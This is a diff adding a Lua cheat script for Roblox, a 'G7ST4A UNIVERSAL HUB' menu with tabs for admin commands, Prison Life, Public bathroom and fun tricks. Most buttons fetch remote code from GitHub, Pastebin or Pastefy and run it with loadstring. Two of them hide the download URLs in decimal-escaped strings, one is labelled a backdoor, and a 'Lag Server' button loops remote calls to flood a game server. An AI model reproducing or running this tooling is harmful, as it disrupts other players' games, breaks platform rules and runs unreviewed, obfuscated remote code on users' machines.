@@ -1,0 +1,226 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "G7ST4A UNIVERSAL HUB", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+local Tab = Window:MakeTab({
+    Name = "Admin Commands",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+local Section = Tab:AddSection({
+    Name = "Admin Commands Tab"
+})
+OrionLib:MakeNotification({
+    Name = "Welcome to G7ST4A HUB",
+    Content = "👾",
+    Image = "rbxassetid://4483345998",
+    Time = 5
+})
+Tab:AddButton({
+    Name = "Infinite Yield",
+    Callback = function()
+              loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+      end    
+})
+Tab:AddButton({
+    Name = "Nameless",
+    Callback = function()
+              loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))();
+      end    
+})
+local Tab = Window:MakeTab({
+    Name = "Prison life",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+Tab:AddButton({
+    Name = "Prison life admin 1(PC)",
+    Callback = function()
+              loadstring(game:HttpGet("https://pastebin.com/raw/wMagw9Cn", true))()
+      end    
+})
+
+Tab:AddButton({
+    Name = "Prison life admin 2 (Mobile / Pc)!",
+    Callback = function()
+              loadstring(game:HttpGet("https://raw.githubusercontent.com/dalloc2/Roblox/main/TigerAdmin.lua"))()
+      end    
+})
+Tab:AddButton({
+    Name = "Lag Server",
+    Callback = function()
+              while wait() do
+local Gun = "Remington 870"
+ 
+local Player = game.Players.LocalPlayer.Name
+ 
+game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver[Gun].ITEMPICKUP)
+ 
+for i,v in pairs(game.Players[Player].Backpack:GetChildren()) do
+    if v.name == (Gun) then
+        v.Parent = game.Players.LocalPlayer.Character
+    end
+end
+ 
+Gun = game.Players[Player].Character[Gun]
+ 
+game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
+ 
+function FireGun(target)
+coroutine.resume(coroutine.create(function()
+local bulletTable = {}
+table.insert(bulletTable, {
+Hit = target,
+Distance = 100,
+Cframe = CFrame.new(0,1,1),
+RayObject = Ray.new(Vector3.new(0.1,0.2), Vector3.new(0.3,0.4))
+})
+game.ReplicatedStorage.ShootEvent:FireServer(bulletTable, Gun)
+wait()
+end))
+end
+ 
+while game:GetService("RunService").Stepped:wait() do
+for count = 0, 10, 10 do
+FireGun()
+end
+end
+end
+      end    
+})
+Tab:AddButton({
+    Name = "Fake Fe Bypass",
+    Callback = function()
+              loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\103\48\48\108\88\112\108\111\105\116\101\114\47\103\48\48\108\88\112\108\111\105\116\101\114\47\109\97\105\110\47\70\101\37\50\48\98\121\112\97\115\115\34\44\32\116\114\117\101\41\41\40\41\10")() 
+      end    
+})
+
+local Tab = Window:MakeTab({
+    Name = "Public bathroom",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+Tab:AddButton({
+    Name = "Spam Paper (restart or stop if holding the paper)",
+    Callback = function()
+               local LP = game.Players.LocalPlayer
+game.ReplicatedStorage.ToolEvents.TpRollEvent:FireServer()
+repeat wait() until LP.Character
+for i,v in pairs(LP.Backpack:GetChildren()) do
+   if v.Name == "TpRoll" then
+       v.Parent = LP.Character
+   end
+end
+while true do
+   wait()
+   for i,v in pairs (LP.Character:GetChildren()) do
+       if v.Name == "TpRoll" then
+           v:Activate()
+       end
+   end
+end
+      end    
+})
+
+local Tab = Window:MakeTab({
+    Name = "Reanimation",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+Tab:AddButton({
+    Name = "Energize R6 / R15",
+    Callback = function()
+              loadstring(game:HttpGet('https://pastebin.com/raw/0MLPL32f'))()
+      end    
+})
+
+local Tab = Window:MakeTab({
+    Name = "Fun",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+Tab:AddButton({
+    Name = "spin (restart to stop running)",
+    Callback = function()
+              
+power = 500 -- change this to make it more or less powerful
+
+game:GetService('RunService').Stepped:connect(function()
+game.Players.LocalPlayer.Character.Head.CanCollide = false
+game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
+game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
+game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
+end)
+wait(.1)
+local bambam = Instance.new("BodyThrust")
+bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
+bambam.Force = Vector3.new(power,0,power)
+bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+      end    
+})
+
+Tab:AddButton({
+    Name = "Walkspeed",
+    Callback = function()
+              loadstring(game:HttpGet("https://pastebin.com/raw/1kmTiaxS"))() 
+      end    
+})
+
+Tab:AddButton({
+    Name = "Mobile Fly",
+    Callback = function()
+              loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
+      end    
+})
+
+Tab:AddButton({
+    Name = "Frakture (Backdoor)",
+    Callback = function()
+              loadstring(game:HttpGet('https://pastefy.app/edMe7Bwx/raw'))()    
+      end    
+})
+
+Tab:AddButton({
+    Name = "Fling",
+    Callback = function()
+              loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_5wpM7bBcOPspmX7lQ3m75SrYNWqxZ858ai3tJdEAId6jSI05IOUB224FQ0VSAswH.lua.txt'),true))()
+      end    
+})
+
+local Tab = Window:MakeTab({
+    Name = "Info",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local Section = Tab:AddSection({
+    Name = "Hi"
+})
+
+local Section = Tab:AddSection({
+    Name = "more updates coming soon"
+})
+
+local Section = Tab:AddSection({
+    Name = "I'm going to make scripts for games and bring scripts from other"
+})
+
+local Section = Tab:AddSection({
+    Name = " Youtubers here"
+})
+
+local Section = Tab:AddSection({
+    Name = "credits: youtube.com/@Gustta15"
+})
+
+local Section = Tab:AddSection({
+    Name = "Roblox: g7sT4a"
+})
+
+local Section = Tab:AddSection({
+    Name = "Instagram: 🤨?"
+})
+
+
+OrionLib:Init()
